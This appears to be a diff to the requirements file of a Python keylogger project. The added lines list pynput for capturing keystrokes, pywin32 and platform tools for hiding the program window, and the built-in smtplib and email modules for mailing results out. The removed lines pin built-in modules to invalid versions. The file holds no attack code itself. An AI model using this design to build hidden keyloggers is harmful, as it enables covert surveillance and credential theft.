@@ -1,14 +1,18 @@
-pynput==1.7.4
-email==7.0.2
-threading==3.0.10
-sys==3.0.10
-email.mime.multipart==7.0.2
-email.mime.text==7.0.2
-platform==1.0.8
-win32gui==7.0.2
-win32con==7.0.2
-os==3.10.1
-smtplib==3.0.10
-keyboard==0.13.5
-email.mime.multipart==7.0.2
-email.mime.text==7.0.2
+#! Python packages for keylogger functionality
+pynput==1.7.6         # For capturing keyboard events
+pywin32==306          # Only required for Windows to hide the program window
+
+#! Built-in modules (no need to install)
+# smtplib             # For sending emails (built-in)
+# email.mime.multipart # For creating email messages (built-in)
+# email.mime.text     # For adding text to the email message (built-in)
+# platform            # For detecting OS (built-in)
+
+#! Optional system dependencies:
+# - The following are not Python packages and may need manual installation on macOS/Linux.
+
+#! For macOS window hiding (no pip install needed)
+# osascript           # Built into macOS by default; handles window hiding commands
+
+#! For Linux window hiding (install directly with the package manager)
+# xdotool             # Install on Linux with `sudo apt install xdotool`
